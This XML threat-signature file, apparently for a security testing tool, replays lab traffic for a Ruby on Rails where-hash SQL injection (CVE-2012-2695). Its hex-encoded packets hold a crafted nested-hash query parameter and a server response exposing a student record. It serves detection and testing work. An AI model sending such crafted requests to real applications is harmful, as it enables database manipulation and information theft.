<?xml version="1.0" encoding="utf-8"?>
<threatSignature>
  <ThreatProperties>
    <ExecDesc display="true" value="Ruby on Rails Where Hash SQL Injection"/>
    <EngDesc display="true" value="A vulnerability has been discovered in Ruby on Rails. The vulnerability is due to an improper input validation error while handling hash values. A remote attacker could exploit this vulnerability by sending malicious SQL code as part of the vulnerable parameter via a specially crafted URL, possibly leading to manipulation of data in the database or information disclosure."/>
    <Intent display="true">
      <item value="Malicious_SQL_Code"/>
    </Intent>
    <Protocol display="true" value="HTTP,HTTPS"/>
    <Type_Of_Equipment display="true">
      <item value="Application"/>
    </Type_Of_Equipment>
    <Known_Vendors_Affected display="true">
      <item value="Ruby_on_Rails"/>
    </Known_Vendors_Affected>
    <Known_Products_Affected display="true">
      <item value="Ruby_on_Rails"/>
    </Known_Products_Affected>
    <Known_Versions_Affected display="true">
      <item value="prior_to_3.2.6"/>
    </Known_Versions_Affected>
    <Credit display="true" value="TSL20120618-02"/>
    <CVEID display="true" value="CVE-2012-2695"/>
    <bugtraqID display="true" value=""/>
    <OSVDB display="true" value="82403"/>
    <Author display="true" value="Tang Ya"/>
    <ID display="true" value="4094b0e8b7b4a80ee9fa0c0a14b8b527"/>
    <Revision display="true" value="1"/>
    <Safe display="true" value=""/>
    <ServerSideAttack display="true" value=""/>
    <SoftwareRevision display="true" value=""/>
    <Suite display="true" value=""/>
    <RunOnce display="false" value=""/>
    <Valid_Traffic display="false" value=""/>
    <AccessVector display="false" value="Network"/>
    <AccessComplexity display="false" value="medium"/>
    <Authentication display="false" value="not-required"/>
    <ConfImpact display="false" value="partial"/>
    <IntegImpact display="false" value="partial"/>
    <AvailImpact display="false" value="partial"/>
    <ImpactBias display="false" value=""/>
    <FirstAdded display="false" value=""/>
    <LastModified display="false" value="634771844726357325"/>
    <SigStyle display="false" value=""/>
    <targetNode display="false" value=""/>
    <SigProtocol display="false" value=""/>
    <Rate display="false" value=""/>
    <Regex display="false" value=""/>
    <Created value="1341826238" display="true"/>
  </ThreatProperties>
  <Variables>
    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="H"/>
    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="I"/>
  </Variables>
  <Loops>
    <for index="A">
      <for index="H"/>
      <for index="I"/>
    </for>
    <for index="B">
      <for index="H"/>
      <for index="I"/>
    </for>
    <for index="D">
      <for index="H"/>
      <for index="I"/>
    </for>
    <for index="E">
      <for index="H"/>
      <for index="I"/>
    </for>
    <for index="F">
      <for index="H"/>
      <for index="I"/>
    </for>
    <for index="G">
      <for index="H"/>
      <for index="I"/>
    </for>
  </Loops>
  <PostScript/>
  <Output index="A" Count="">
    <Ethernet srcMac="00:0C:29:78:F0:5E" destMac="00:0C:29:5A:1D:9B" pktType="0800">
      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0160" Identification="A9CC" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="E6E4" srcIP="172.16.8.9" destIP="$destIP" options="" CE="false" DF="true" MF="false">
        <TCP srcPort="3050" destPort="$HTTPdestPort" SeqNumber="A36BEC54" AckNumber="654C67B7" HeaderLength="05" WindowSize="FAF0" Checksum="E5CF" UrgentPointer="0000" Options="" Payload="474554202F73747564656E74733F69645B73747564656E74735B706173735D5D3D353731323720485454502F312E310D0A486F73743A203137322E31362E382E3138390D0A557365722D4167656E743A204D6F7A696C6C612F352E30202857696E646F7773204E5420352E313B2072763A31322E3029204765636B6F2F32303130303130312046697265666F782F31322E300D0A4163636570743A20746578742F68746D6C2C6170706C69636174696F6E2F7868746D6C2B786D6C2C6170706C69636174696F6E2F786D6C3B713D302E392C2A2F2A3B713D302E380D0A4163636570742D4C616E67756167653A20656E2D75732C656E3B713D302E350D0A4163636570742D456E636F64696E673A20677A69702C206465666C6174650D0A436F6E6E656374696F6E3A206B6565702D616C6976650D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
      </IP>
    </Ethernet>
  </Output>
  <Output index="D" Count="">
    <Ethernet srcMac="00:0C:29:78:F0:5E" destMac="00:0C:29:5A:1D:9B" pktType="0800">
      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="02AE" Identification="A9D2" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="E590" srcIP="172.16.8.9" destIP="$destIP" options="" CE="false" DF="true" MF="false">
        <TCP srcPort="3050" destPort="$HTTPdestPort" SeqNumber="A36BED8C" AckNumber="654C6FBC" HeaderLength="05" WindowSize="FAF0" Checksum="1E1D" UrgentPointer="0000" Options="" Payload="474554202F6173736574732F6170706C69636174696F6E2E6373733F626F64793D3120485454502F312E310D0A486F73743A203137322E31362E382E3138390D0A557365722D4167656E743A204D6F7A696C6C612F352E30202857696E646F7773204E5420352E313B2072763A31322E3029204765636B6F2F32303130303130312046697265666F782F31322E300D0A4163636570743A20746578742F6373732C2A2F2A3B713D302E310D0A4163636570742D4C616E67756167653A20656E2D75732C656E3B713D302E350D0A4163636570742D456E636F64696E673A20677A69702C206465666C6174650D0A436F6E6E656374696F6E3A206B6565702D616C6976650D0A526566657265723A20687474703A2F2F3137322E31362E382E3138392F73747564656E74733F69645B73747564656E74735B706173735D5D3D35373132370D0A436F6F6B69653A205F626C6F675F73657373696F6E3D424168374279495158324E7A636D5A66644739725A5734694D586379527A5252636B64775A464E765454637A566D6C6F656D3169636C6469556C64694E6A5930556A463253336C4B626B523353473130635763394967397A5A584E7A6157397558326C6B4969566D5A4759335A444D7A597A5579597A41354E7A67784F44646D4F5455774E6D4D354E6D45324F4745354E772533442533442D2D663830383733346635653461373662633037636638353336343263613363363735383439656530660D0A49662D4D6F6469666965642D53696E63653A204672692C203038204A756E20323031322031393A32343A313920474D540D0A49662D4E6F6E652D4D617463683A20226663643831646539653239346630326263343238613563663035396430313461220D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
      </IP>
    </Ethernet>
  </Output>
  <Output index="F" Count="">
    <Ethernet srcMac="00:0C:29:78:F0:5E" destMac="00:0C:29:5A:1D:9B" pktType="0800">
      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="029D" Identification="AA12" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="E561" srcIP="172.16.8.9" destIP="$destIP" options="" CE="false" DF="true" MF="false">
        <TCP srcPort="3050" destPort="$HTTPdestPort" SeqNumber="A36BF012" AckNumber="654C70A6" HeaderLength="05" WindowSize="FA06" Checksum="3669" UrgentPointer="0000" Options="" Payload="474554202F6173736574732F6A71756572795F756A732E6A733F626F64793D3120485454502F312E310D0A486F73743A203137322E31362E382E3138390D0A557365722D4167656E743A204D6F7A696C6C612F352E30202857696E646F7773204E5420352E313B2072763A31322E3029204765636B6F2F32303130303130312046697265666F782F31322E300D0A4163636570743A202A2F2A0D0A4163636570742D4C616E67756167653A20656E2D75732C656E3B713D302E350D0A4163636570742D456E636F64696E673A20677A69702C206465666C6174650D0A436F6E6E656374696F6E3A206B6565702D616C6976650D0A526566657265723A20687474703A2F2F3137322E31362E382E3138392F73747564656E74733F69645B73747564656E74735B706173735D5D3D35373132370D0A436F6F6B69653A205F626C6F675F73657373696F6E3D424168374279495158324E7A636D5A66644739725A5734694D586379527A5252636B64775A464E765454637A566D6C6F656D3169636C6469556C64694E6A5930556A463253336C4B626B523353473130635763394967397A5A584E7A6157397558326C6B4969566D5A4759335A444D7A597A5579597A41354E7A67784F44646D4F5455774E6D4D354E6D45324F4745354E772533442533442D2D663830383733346635653461373662633037636638353336343263613363363735383439656530660D0A49662D4D6F6469666965642D53696E63653A204672692C203038204A756E20323031322031393A30313A353220474D540D0A49662D4E6F6E652D4D617463683A20223066663365353638306561643364616465656530323163313434383335333131220D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
      </IP>
    </Ethernet>
  </Output>
  <Input>
    <Ethernet/>
  </Input>
  <ServerSide display="1,3,5">
    <Output index="B" Count="">
      <Ethernet srcMac="00:0C:29:5A:1D:9B" destMac="00:0C:29:78:F0:5E" pktType="0800">
        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0293" Identification="B904" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="167A" srcIP="$destIP" destIP="172.16.8.9" options="" CE="false" DF="true" MF="false">
          <TCP srcPort="$HTTPdestPort" destPort="3050" SeqNumber="654C67B7" AckNumber="A36BED8C" HeaderLength="05" WindowSize="3CB8" Checksum="FF80" UrgentPointer="0000" Options="" Payload="485454502F312E3120323030204F4B200D0A43616368652D436F6E74726F6C3A206D61782D6167653D302C20707269766174652C206D7573742D726576616C69646174650D0A5365727665723A205745427269636B2F312E332E312028527562792F312E382E372F323031312D30362D3330290D0A446174653A205468752C203134204A756E20323031322031333A31323A353520474D540D0A436F6E74656E742D4C656E6774683A20313433340D0A582D52756E74696D653A20302E3032353634360D0A436F6E74656E742D547970653A20746578742F68746D6C3B20636861727365743D7574662D380D0A582D55612D436F6D70617469626C653A2049453D456467650D0A436F6E6E656374696F6E3A204B6565702D416C6976650D0A582D526571756573742D49643A2032346133356237356534656165333961386336356466613430323637393332350D0A457461673A20226430333934643562306264353066613861303762343337616133313264653162220D0A5365742D436F6F6B69653A205F626C6F675F73657373696F6E3D424168374279495158324E7A636D5A66644739725A5734694D586379527A5252636B64775A464E765454637A566D6C6F656D3169636C6469556C64694E6A5930556A463253336C4B626B523353473130635763394967397A5A584E7A6157397558326C6B4969566D5A4759335A444D7A597A5579597A41354E7A67784F44646D4F5455774E6D4D354E6D45324F4745354E772533442533442D2D663830383733346635653461373662633037636638353336343263613363363735383439656530663B20706174683D2F3B20487474704F6E6C790D0A0D0A3C21444F43545950452068746D6C3E0A3C68746D6C3E0A3C686561643E0A20203C7469746C653E426C6F673C2F7469746C653E0A20203C6C696E6B20687265663D222F6173736574732F6170706C69636174696F6E2E6373733F626F64793D3122206D656469613D22616C6C222072656C3D227374796C6573686565742220747970653D22746578742F63737322202F3E0A3C6C696E6B20687265663D222F6173736574732F686F6D652E6373733F626F64793D3122206D656469613D22616C6C222072656C3D227374796C6573686565742220747970653D22746578742F63737322202F3E0A3C6C696E6B20687265663D222F6173736574732F73636166666F6C64732E6373733F626F64793D3122206D656469613D22616C6C222072656C3D227374796C6573686565742220747970653D22746578742F63737322202F3E0A3C6C696E6B20687265663D222F6173736574732F73747564656E74732E6373733F626F64793D3122206D656469613D22616C6C222072656C3D227374796C6573686565742220747970653D22746578742F63737322202F3E0A20203C736372697074207372633D222F6173736574732F6A71756572792E6A733F626F64793D312220747970653D22746578742F6A617661736372697074223E3C2F7363726970743E0A3C736372697074207372633D222F6173736574732F6A71756572795F756A732E6A733F626F64793D312220747970653D22746578742F6A617661736372697074223E3C2F7363726970743E0A3C736372697074207372633D222F6173736574732F686F6D652E6A733F626F64793D312220747970653D22746578742F6A617661736372697074223E3C2F7363726970743E0A3C736372697074207372633D222F6173736574732F73747564656E74732E6A733F626F64793D312220747970653D22746578742F6A617661736372697074223E3C2F7363726970743E0A3C736372697074207372633D222F6173736574732F6170706C69636174696F6E2E6A733F626F64793D312220747970653D22746578742F6A617661736372697074223E3C2F7363726970743E0A20203C6D65746120636F6E74656E743D2261757468656E7469636974795F746F6B656E22206E616D653D22637372662D706172616D22202F3E0A3C6D65746120636F6E74656E743D22773247345172477064536F4D37335669687A6D627257625257623636345231764B794A6E4477486D7471673D22206E616D653D22637372662D746F6B656E22202F3E0A3C2F686561643E0A3C626F64793E0A0A3C68313E4C697374696E672073747564656E74733C2F68313E0A0A3C7461626C653E0A20203C74723E0A202020203C74683E49643C2F74683E0A202020203C74683E4E616D653C2F74683E0A202020203C74683E506173733C2F74683E0A202020203C74683E3C2F74683E0A202020203C74683E3C2F74683E0A202020203C74683E3C2F74683E0A20203C2F74723E0A0A20203C74723E0A202020203C74643E323C2F74643E0A202020203C74643E4D657263656465733C2F74643E0A202020203C74643E35373132373C2F74643E0A202020203C74643E3C6120687265663D222F73747564656E74732F32223E53686F773C2F613E3C2F74643E0A202020203C74643E3C6120687265663D222F73747564656E74732F322F65646974223E456469743C2F613E3C2F74643E0A202020203C74643E3C6120687265663D222F73747564656E74732F322220646174612D636F6E6669726D3D2241726520796F7520737572653F2220646174612D6D6574686F643D2264656C657465222072656C3D226E6F666F6C6C6F77223E44657374726F793C2F613E3C2F74643E0A20203C2F74723E0A3C2F7461626C653E0A0A3C6272202F3E0A0A3C6120687265663D222F73747564656E74732F6E6577223E4E65772053747564656E743C2F613E0A0A0A3C2F626F64793E0A3C2F68746D6C3E0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
        </IP>
      </Ethernet>
    </Output>
    <Output index="E" Count="">
      <Ethernet srcMac="00:0C:29:5A:1D:9B" destMac="00:0C:29:78:F0:5E" pktType="0800">
        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0112" Identification="B906" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="17F9" srcIP="$destIP" destIP="172.16.8.9" options="" CE="false" DF="true" MF="false">
          <TCP srcPort="$HTTPdestPort" destPort="3050" SeqNumber="654C6FBC" AckNumber="A36BF012" HeaderLength="05" WindowSize="419C" Checksum="85B0" UrgentPointer="0000" Options="" Payload="485454502F312E3120333034204E6F74204D6F646966696564200D0A43616368652D436F6E74726F6C3A206E6F2D63616368650D0A5365727665723A205745427269636B2F312E332E312028527562792F312E382E372F323031312D30362D3330290D0A446174653A205468752C203134204A756E20323031322031333A31323A353520474D540D0A582D52756E74696D653A20302E3031313435390D0A582D55612D436F6D70617469626C653A2049453D456467650D0A582D526571756573742D49643A2065346463616665373862616162303231656639383731646434336264623965320D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
        </IP>
      </Ethernet>
    </Output>
    <Output index="G" Count="">
      <Ethernet srcMac="00:0C:29:5A:1D:9B" destMac="00:0C:29:78:F0:5E" pktType="0800">
        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0112" Identification="B908" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="17F7" srcIP="$destIP" destIP="172.16.8.9" options="" CE="false" DF="true" MF="false">
          <TCP srcPort="$HTTPdestPort" destPort="3050" SeqNumber="654C70A6" AckNumber="A36BF287" HeaderLength="05" WindowSize="46A8" Checksum="147A" UrgentPointer="0000" Options="" Payload="485454502F312E3120333034204E6F74204D6F646966696564200D0A43616368652D436F6E74726F6C3A206E6F2D63616368650D0A5365727665723A205745427269636B2F312E332E312028527562792F312E382E372F323031312D30362D3330290D0A446174653A205468752C203134204A756E20323031322031333A31323A353520474D540D0A582D52756E74696D653A20302E3030343230370D0A582D55612D436F6D70617469626C653A2049453D456467650D0A582D526571756573742D49643A2032333562623832623465393332643332613331396335316430653034323238320D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
        </IP>
      </Ethernet>
    </Output>
  </ServerSide>
</threatSignature>
